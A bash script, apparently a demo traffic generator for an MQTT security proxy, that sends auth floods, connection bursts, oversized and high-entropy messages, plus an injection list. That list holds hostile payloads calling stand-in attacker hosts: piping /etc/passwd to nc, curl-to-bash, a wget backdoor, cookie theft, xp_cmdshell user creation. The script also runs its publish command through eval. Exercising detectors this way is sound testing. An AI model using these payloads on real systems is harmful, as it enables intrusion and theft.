#!/bin/bash
#
# MQTT Sentinel — Bad Traffic Simulator
#
# Generates continuous bad traffic patterns for Grafana dashboard visualization.
# Run this during a demo to keep dashboards active with real-time security events.
#
# Usage:
#   ./simulate-bad-traffic.sh                    # Run all attack types in a loop
#   ./simulate-bad-traffic.sh --mode auth-flood  # Run specific attack type
#   ./simulate-bad-traffic.sh --duration 60      # Run for 60 seconds
#   ./simulate-bad-traffic.sh --interval 2       # 2 seconds between rounds
#
# Modes:
#   mixed             All attack types in rotation (default)
#   auth-flood        Rapid invalid credential attempts
#   connection-flood  Burst connections to trigger rate limiting
#   injection         Malicious payload injection attacks
#   size-anomaly      Oversized payloads
#   entropy           High-entropy / encoded payloads
#
# Environment variables:
#   MQTT_HOST       - Proxy endpoint (default: mqtt.connected-cloud.io)
#   MQTT_PORT       - MQTTS port (default: 30883)
#   MQTT_USER       - Valid test user for payload attacks (default: user1)
#   MQTT_PASS       - Test user password (default: user1)
#   USE_TLS         - Use TLS (default: true)

set -euo pipefail

# Configuration
MQTT_HOST="${MQTT_HOST:-mqtt.connected-cloud.io}"
MQTT_PORT="${MQTT_PORT:-30883}"
MQTT_USER="${MQTT_USER:-user1}"
MQTT_PASS="${MQTT_PASS:-user1}"
USE_TLS="${USE_TLS:-true}"
MODE="mixed"
DURATION=0  # 0 = infinite
INTERVAL=3
ROUND=0

# Colors
BOLD='\033[1m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
DIM='\033[2m'
NC='\033[0m'

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --mode)     MODE="$2"; shift 2 ;;
        --duration) DURATION="$2"; shift 2 ;;
        --interval) INTERVAL="$2"; shift 2 ;;
        --help|-h)
            echo "Usage: $0 [--mode MODE] [--duration SECS] [--interval SECS]"
            echo ""
            echo "Modes: mixed, auth-flood, connection-flood, injection, size-anomaly, entropy"
            echo ""
            echo "Environment: MQTT_HOST, MQTT_PORT, MQTT_USER, MQTT_PASS, USE_TLS"
            exit 0
            ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

# TLS args
TLS_ARGS=""
if [ "$USE_TLS" = "true" ]; then
    TLS_ARGS="--capath /etc/ssl/certs --insecure"
fi

START_TIME=$(date +%s)

mqtt_pub_quiet() {
    local user="$1" pass="$2" topic="$3" message="$4"
    local cmd="mosquitto_pub -h $MQTT_HOST -p $MQTT_PORT -u '$user' -P '$pass' -t '$topic' -m '$message'"
    if [ "$USE_TLS" = "true" ]; then
        cmd="$cmd $TLS_ARGS"
    fi
    eval $cmd > /dev/null 2>&1 || true
}

log_attack() {
    local type="$1" detail="$2"
    local elapsed=$(( $(date +%s) - START_TIME ))
    printf "  ${DIM}[%4ds]${NC} ${RED}%-20s${NC} %s\n" "$elapsed" "$type" "$detail"
}

check_duration() {
    if [ "$DURATION" -gt 0 ]; then
        local elapsed=$(( $(date +%s) - START_TIME ))
        if [ "$elapsed" -ge "$DURATION" ]; then
            echo ""
            echo -e "${GREEN}Duration reached ($DURATION seconds). Stopping.${NC}"
            exit 0
        fi
    fi
}

# ─────────────────────────────────────────────────────────────────────
# Attack generators
# ─────────────────────────────────────────────────────────────────────

attack_auth_flood() {
    echo -e "  ${YELLOW}[AUTH FLOOD]${NC} Sending 10 invalid credential attempts..."
    local users=("hacker-$RANDOM" "admin" "root" "scanner-$RANDOM" "bruteforce-$RANDOM"
                 "test-$RANDOM" "device-fake-$RANDOM" "null" "anonymous" "exploit-$RANDOM")
    for user in "${users[@]}"; do
        mqtt_pub_quiet "$user" "wrong-password-$RANDOM" "test/auth" "probe" &
        log_attack "AUTH_FAILURE" "user=$user"
    done
    wait
}

attack_connection_flood() {
    echo -e "  ${YELLOW}[CONN FLOOD]${NC} Sending 30 rapid connections..."
    for i in $(seq 1 30); do
        mqtt_pub_quiet "flood-client-$RANDOM" "pass" "test/flood" "burst" &
        if (( i % 10 == 0 )); then
            log_attack "RATE_LIMIT" "burst=$i connections"
        fi
    done
    wait
}

attack_injection() {
    echo -e "  ${YELLOW}[INJECTION]${NC} Sending malicious payloads..."
    local payloads=(
        "' OR '1'='1; DROP TABLE users; --"
        "; cat /etc/passwd | nc attacker.com 4444"
        "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
        "../../../etc/shadow"
        "ALERT\$(curl http://evil.com/shell.sh | bash)"
        "'; EXEC xp_cmdshell('net user hacker P@ss /add'); --"
        "<img src=x onerror=alert(1)>"
        "ALERT && wget http://malware.com/backdoor -O /tmp/shell"
        "{{7*7}}${7*7}<%= 7*7 %>"
        "; ping -c 10 attacker.com &"
    )
    for payload in "${payloads[@]}"; do
        mqtt_pub_quiet "$MQTT_USER" "$MQTT_PASS" "clients/$MQTT_USER/alerts" "$payload"
        log_attack "PATTERN_VIOLATION" "${payload:0:50}..."
        sleep 0.2
    done
}

attack_size_anomaly() {
    echo -e "  ${YELLOW}[SIZE ANOMALY]${NC} Sending oversized payloads..."
    for size in 50000 100000 200000; do
        local payload=$(head -c $size /dev/urandom | base64 | tr -d '\n' | head -c $size)
        mqtt_pub_quiet "$MQTT_USER" "$MQTT_PASS" "clients/$MQTT_USER/alerts" "$payload"
        log_attack "SIZE_ANOMALY" "payload=${size} bytes"
        sleep 0.5
    done
}

attack_entropy() {
    echo -e "  ${YELLOW}[ENTROPY]${NC} Sending high-entropy payloads..."
    local payloads=(
        "$(head -c 1024 /dev/urandom | base64 | tr -d '\n')"
        "$(head -c 2048 /dev/urandom | base64 | tr -d '\n')"
        "U2FsdGVkX1+vupppZksvRf5pq5g5XjFRIipRkwB0K1Y96Qsv2Lm+31cmzaAILwytXxYz"
        "H4sIAAAAAAAAA0tJTc7PLShKLS5RBABVnD7JDQAAAAxMzE0tTcxNLUwB"
        "$(openssl rand -hex 512 2>/dev/null || head -c 512 /dev/urandom | xxd -p | tr -d '\n')"
    )
    for payload in "${payloads[@]}"; do
        mqtt_pub_quiet "$MQTT_USER" "$MQTT_PASS" "clients/$MQTT_USER/alerts" "$payload"
        log_attack "ENTROPY_ANOMALY" "length=${#payload} bytes"
        sleep 0.3
    done
}

# ─────────────────────────────────────────────────────────────────────
# Main loop
# ─────────────────────────────────────────────────────────────────────

echo ""
echo -e "${BOLD}${RED}MQTT Sentinel — Bad Traffic Simulator${NC}"
echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  Target:   ${CYAN}$MQTT_HOST:$MQTT_PORT${NC}"
echo -e "  Mode:     ${CYAN}$MODE${NC}"
echo -e "  Interval: ${CYAN}${INTERVAL}s between rounds${NC}"
if [ "$DURATION" -gt 0 ]; then
    echo -e "  Duration: ${CYAN}${DURATION}s${NC}"
else
    echo -e "  Duration: ${CYAN}infinite (Ctrl+C to stop)${NC}"
fi
echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

# Trap Ctrl+C
trap 'echo ""; echo -e "${GREEN}Stopped. Total rounds: $ROUND${NC}"; exit 0' INT

while true; do
    ROUND=$((ROUND + 1))
    echo -e "${BOLD}Round $ROUND${NC} $(date '+%H:%M:%S')"

    case "$MODE" in
        auth-flood)
            attack_auth_flood
            ;;
        connection-flood)
            attack_connection_flood
            ;;
        injection)
            attack_injection
            ;;
        size-anomaly)
            attack_size_anomaly
            ;;
        entropy)
            attack_entropy
            ;;
        mixed)
            # Rotate through all attack types
            case $((ROUND % 5)) in
                0) attack_auth_flood ;;
                1) attack_connection_flood ;;
                2) attack_injection ;;
                3) attack_size_anomaly ;;
                4) attack_entropy ;;
            esac
            ;;
        *)
            echo "Unknown mode: $MODE"
            exit 1
            ;;
    esac

    check_duration
    echo ""
    sleep "$INTERVAL"
done
